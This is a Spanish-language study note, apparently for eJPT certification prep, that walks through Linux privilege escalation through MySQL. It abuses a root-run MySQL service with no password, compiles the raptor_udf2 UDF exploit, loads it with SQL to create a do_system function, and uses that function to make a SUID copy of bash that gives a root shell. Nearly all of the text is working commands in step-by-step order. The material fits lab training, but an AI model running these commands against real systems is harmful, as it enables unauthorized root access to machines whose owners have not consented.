- Como primera medida ejecutamos el comando:

```
user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

```

- Luego ejecutamos los comandos:

```
user@debian:~/tools/mysql-udf$ ps aux | grep mysql
root      1923  0.0  0.1   9180  1400 ?        S    17:21   0:00 /bin/sh /usr/bin/mysqld_safe
root      2048  0.0  2.3 163616 24172 ?        Sl   17:21   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
root      2049  0.0  0.0   3896   644 ?        S    17:21   0:00 logger -t mysqld -p daemon.error
user      2682  0.0  0.0   7588   852 pts/0    S+   17:43   0:00 grep mysql
```

para poder observar si el servicio de mysql esta ejecutandose

- El servicio MySQL se ejecuta como root y el usuario "root" del servicio no tiene una contraseña asignada. Podemos utilizar un exploit popular que aprovecha las funciones definidas por el usuario (UDF) para ejecutar comandos del sistema como root a través del servicio MySQL.

- Compilamos el exploit raptor_udf2.c (https://github.com/ankh2054/MySQL-UDF/blob/master/raptor_udf2.c) con los siguientes comandos:

```
gcc -g -c raptor_udf2.c -fPIC  
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

- Nos conectamos al servicio MySQL como usuario root con una contraseña en blanco:

```
mysql -u root
```

- Ejecute los siguientes comandos en el shell MySQL para crear una función definida por el usuario (UDF) "do_system" utilizando nuestro exploit compilado

```
use mysql;  
create table foo(line blob);  
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));  
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';  
create function do_system returns integer soname 'raptor_udf2.so';
```

- Utilice la función para copiar /bin/bash a /tmp/rootbash y establecer el permiso SUID:

```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

- Salga del shell MySQL (escriba exit o \q y presione Enter) y ejecute el ejecutable /tmp/rootbash con -p para obtener un shell que se ejecute con privilegios de root:

```
./rootbash -p
```

y listo ya tenes un shell como root.

enlace:
[Preparacion-Ejpt](Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt.md)



